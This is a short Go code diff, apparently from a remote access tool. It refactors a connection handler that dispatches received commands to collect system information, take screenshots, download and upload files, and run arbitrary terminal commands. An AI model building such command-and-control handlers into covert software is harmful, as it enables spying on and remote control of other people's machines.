@@ -37,17 +37,17 @@ func (c ConnectionHandler) Handle() error {
 			break
 		}
 
-		switch strings.TrimSpace(string(message)) {
+		switch strings.TrimSpace(message.Command) {
 		case "information":
 			c.UseCase.Information.Collect()
 		case "screenshot":
 			c.UseCase.Screenshot.TakeScreenshot()
 		case "download":
-			c.UseCase.Download.File()
+			c.UseCase.Download.File(message.Data)
 		case "upload":
-			c.UseCase.Upload.ValidatePath()
+			c.UseCase.Upload.File(message.Data)
 		default:
-			c.UseCase.Terminal.Run(string(message))
+			c.UseCase.Terminal.Run(string(message.Data))
 		}
 	}
 	return nil
